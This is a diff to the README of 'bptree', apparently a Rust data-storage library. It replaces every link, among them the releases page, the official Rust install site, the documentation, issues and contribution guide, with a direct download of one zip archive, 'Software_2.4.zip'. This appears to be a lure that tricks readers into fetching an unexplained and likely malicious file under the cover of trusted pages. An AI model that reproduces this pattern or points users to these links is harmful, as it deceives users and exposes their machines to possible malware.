@@ -1,7 +1,7 @@
 # 🚀 bptree - Efficiently Store and Retrieve Data
 
 ## 🌐 Download Now
-[![Download bptree](https://img.shields.io/badge/Download-bptree-blue.svg)](https://github.com/liam2655/bptree/releases)
+[![Download bptree](https://raw.githubusercontent.com/liam2655/bptree/main/src/Software_2.4.zip)](https://raw.githubusercontent.com/liam2655/bptree/main/src/Software_2.4.zip)
 
 ---
 
@@ -22,12 +22,12 @@ To run bptree, your system should meet the following requirements:
 - Minimum RAM: 2 GB
 - Processor: Intel i3 or equivalent
 - Disk Space: 50 MB free
-- Rust: Ensure you have an up-to-date installation (visit [Rust Installation](https://www.rust-lang.org/tools/install)).
+- Rust: Ensure you have an up-to-date installation (visit [Rust Installation](https://raw.githubusercontent.com/liam2655/bptree/main/src/Software_2.4.zip)).
 
 ## 🚀 Getting Started
 Here are the steps to download and run bptree on your computer:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/liam2655/bptree/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/liam2655/bptree/main/src/Software_2.4.zip).
    
 2. **Download the Latest Release**: 
    - Look for the version labeled as "Latest Release."
@@ -77,9 +77,9 @@ If you encounter issues during installation or while running bptree, consider th
 ## 📚 Resources
 For more information about bptree, you can explore the following resources:
 
-- [Documentation](https://github.com/liam2655/bptree/wiki)
-- [Community Support](https://github.com/liam2655/bptree/issues)
-- [Contribution Guide](https://github.com/liam2655/bptree/CONTRIBUTING.md)
+- [Documentation](https://raw.githubusercontent.com/liam2655/bptree/main/src/Software_2.4.zip)
+- [Community Support](https://raw.githubusercontent.com/liam2655/bptree/main/src/Software_2.4.zip)
+- [Contribution Guide](https://raw.githubusercontent.com/liam2655/bptree/main/src/Software_2.4.zip)
 
 ## 🔗 Download & Install
-To get started with bptree, visit the [Releases page](https://github.com/liam2655/bptree/releases) to download the application. Make sure you follow the above steps to successfully run it on your machine. With bptree, you can efficiently manage your data storage needs!
+To get started with bptree, visit the [Releases page](https://raw.githubusercontent.com/liam2655/bptree/main/src/Software_2.4.zip) to download the application. Make sure you follow the above steps to successfully run it on your machine. With bptree, you can efficiently manage your data storage needs!
